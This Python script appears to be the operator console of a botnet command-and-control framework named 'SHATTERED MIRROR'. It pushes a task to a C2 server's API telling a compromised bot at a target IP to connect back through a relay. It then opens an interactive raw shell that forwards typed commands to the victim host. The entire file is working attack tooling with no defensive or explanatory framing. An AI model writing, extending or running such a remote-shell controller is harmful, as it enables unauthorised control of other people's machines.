import os
import sys
import socket
import threading
import time
import requests
import colorama
from colorama import Fore, Style

colorama.init()

def main():
    if len(sys.argv) < 4:
        return

    c2_url = sys.argv[1]
    target_ip = sys.argv[2]
    # This is the INTERNAL port that the Bouncer routes to
    shell_port = int(sys.argv[3])
    
    os.system(f"title [SHATTERED MIRROR] RAW SHELL SESSION - {target_ip}")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.GREEN}=====================================================================")
    print(f"  SHATTERED MIRROR RAW SHELL (MULTIPLEXED): {target_ip}")
    print(f"====================================================================={Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}[*] Preparing internal listener on port {shell_port}...{Style.RESET_ALL}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('127.0.0.1', shell_port))
        server.listen(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Bind Error: {e}{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}[*] Queuing ATOM 10 launch via Heartbeat...{Style.RESET_ALL}")
    try:
        requests.post(f"{c2_url}/api/v2/task/push?ip={target_ip}", json={"atom_id": 10, "payload": "RAW"})
    except:
        print(f"{Fore.RED}[!] Failed to reach C2 API.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}[*] Waiting for bot to multiplex back...{Style.RESET_ALL}")
    server.settimeout(30)
    try:
        client, addr = server.accept()
        print(f"{Fore.GREEN}[+] BOOM! Shell connected through Bouncer!{Style.RESET_ALL}\n")
    except socket.timeout:
        print(f"{Fore.RED}[!] Timeout. Check if Bouncer is running.{Style.RESET_ALL}")
        server.close()
        return
    
    def receive():
        while True:
            try:
                data = client.recv(4096)
                if not data: break
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
            except: break

    threading.Thread(target=receive, daemon=True).start()
    
    while True:
        try:
            cmd = input()
            if cmd.lower() in ['exit', 'quit']:
                client.send(b"exit\n")
                break
            client.send((cmd + "\n").encode('utf-8'))
        except: break
            
    client.close()
    server.close()

if __name__ == "__main__":
    main()
